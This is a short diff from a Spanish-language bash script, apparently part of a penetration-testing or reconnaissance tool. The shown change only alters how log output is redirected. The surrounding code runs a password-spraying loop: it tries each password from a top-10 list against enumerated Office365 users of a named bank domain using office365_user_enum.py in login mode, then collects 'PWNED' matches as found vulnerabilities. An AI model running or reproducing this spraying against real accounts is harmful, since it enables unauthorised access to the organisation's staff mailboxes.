@@ -264,8 +264,8 @@ if [ -f .enumeracion2/"$DOMINIO"_office365_users.txt ]
 then		
 	echo -e "[+] Probando Office365 passwords"
 	for password in $(cat top10.txt); do
-		echo -e "\t[+] Probando password $password"		
-		office365_user_enum.py -m login -i .enumeracion2/bancofie.com.bo_office365_users.txt -p $password > logs/cracking/correo_office365_passwordAdivinadoUser.txt 2>> /dev/null
+		echo -e "\t[+] Probando password $password"				
+		office365_user_enum.py -m login -i .enumeracion2/bancofie.com.bo_office365_users.txt -p $password >> logs/cracking/correo_office365_passwordAdivinadoUser.txt 2>/dev/null
 	done
 	grep 'PWNED'  logs/cracking/correo_office365_passwordAdivinadoUser.txt >  .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt
 	
